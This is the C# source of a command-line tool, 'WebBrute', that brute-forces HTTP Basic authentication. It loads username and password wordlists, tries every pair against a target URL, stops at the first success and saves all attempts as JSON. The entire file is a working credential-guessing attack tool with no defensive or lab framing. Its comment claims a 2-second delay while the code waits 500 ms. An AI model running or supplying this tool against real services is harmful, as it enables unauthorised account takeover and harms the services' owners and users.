using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using Newtonsoft.Json;
using System.IO;
using System.Net;
using System.Threading;

namespace WebBrute
{
    public class LoginAttempt
    {
        public string ID { get; set; }
        public string Username { get; set; }
        public string Password { get; set; }
        public DateTime AttemptTime { get; set; }
        public int ResponseCode { get; set; }
        public string RawResponse { get; set; }
        public bool Success { get; set; }
    }

    public class Brutal
    {
        public List<LoginAttempt> Attempts { get; set; }
        public List<string> Usernames { get; set; }
        public List<string> Passwords { get; set; }
        public string Target { get; set; }

        public static Brutal Load(string JSON)
        {
            return JsonConvert.DeserializeObject<Brutal>(JSON);
        }

        public string Save()
        {
            return JsonConvert.SerializeObject(this);
        }

        public void LoadUsers(string Filename)
        {
            if (Usernames == null)
            {
                Usernames = new List<string>();
            }

            if(File.Exists(Filename))
            {
                Usernames = Usernames.Concat(File.ReadAllLines(Filename).ToList()).ToList();
            }
        }

        public void LoadPasswords(string Filename)
        {
            if (Passwords == null)
            {
                Passwords = new List<string>();
            }

            if (File.Exists(Filename))
            {
                Passwords = Passwords.Concat(File.ReadAllLines(Filename).ToList()).ToList();
            }
        }

        public void Process(string strTarget)
        {
            Target = strTarget;
            string RespData = string.Empty;
            int code = 0;
            bool bSuccess = false;

            Console.CursorLeft = 0;
            Console.CursorTop = 0;
            Console.Write("Processing URL: {0}", strTarget);

            int ucount = 1;
            int pcount = 1;

            if (Attempts == null)
            {
                Attempts = new List<LoginAttempt>();
            }

            foreach (var user in Usernames)
            {
                Console.CursorLeft = 0;
                Console.CursorTop = 1;
                Console.Write("Username {0} of {1}", ucount++, Usernames.Count);
                foreach (var pwd in Passwords)
                {
                    Console.CursorLeft = 0;
                    Console.CursorTop = 2;
                    Console.Write("Password {0} of {1}", pcount++, Passwords.Count);
                    Console.CursorLeft = 0;
                    Console.CursorTop = 3;
                    Console.Write("Trying user: {0}     Password: {1}                   ", user, pwd);
                    WebClient cli = new WebClient();
                    string credentials = Convert.ToBase64String(
                        Encoding.ASCII.GetBytes(user + ":" + pwd));
                    cli.Headers[HttpRequestHeader.Authorization] = string.Format(
                        "Basic {0}", credentials);
                    cli.UseDefaultCredentials = false;

                    try
                    {
                        RespData = cli.DownloadString(Target);
                        Console.CursorLeft = 0;
                        Console.CursorTop = 4;
                        Console.Write("Success.....");
                        bSuccess = true;
                        break;
                    }
                    catch (WebException exp)
                    {
                        if (exp.Status == WebExceptionStatus.ProtocolError)
                        {
                            Console.CursorLeft = 0;
                            Console.CursorTop = 4;
                            Console.Write("Failed authentication....");
                            StreamReader rdr = new StreamReader(exp.Response.GetResponseStream());
                            RespData = rdr.ReadToEnd();
                            rdr.Close();
                        }

                        HttpWebResponse response = (HttpWebResponse)exp.Response; 
                        code = Convert.ToInt32(response.StatusCode);
                    }
                    catch (Exception e)
                    {
                        code = 0;
                        Console.WriteLine(e);
                    }

                    // Build an attempt
                    LoginAttempt attempt = new LoginAttempt();
                    attempt.AttemptTime = DateTime.Now;
                    attempt.ID = Guid.NewGuid().ToString();
                    attempt.Password = pwd;
                    attempt.RawResponse = RespData;
                    attempt.ResponseCode = code;
                    attempt.Username = user;

                    if (code == 200)
                    {
                        attempt.Success = true;
                    }
                    else
                    {
                        attempt.Success = false;
                    }

                    Attempts.Add(attempt);

                    // wait for 2 seconds between attempts
                    Thread.Sleep(500);
                }

                if (bSuccess)
                {
                    break;
                }
            }
        }
    }

    class Program
    {
        static void Main(string[] args)
        {
            string Usernames = args[0];
            string Passwords = args[1];

            Brutal brute = new Brutal();
            brute.LoadUsers(Usernames);
            brute.LoadPasswords(Passwords);

            brute.Process(args[2]);

            File.WriteAllText(args[3], brute.Save());

            Console.ReadKey();
        }
    }
}
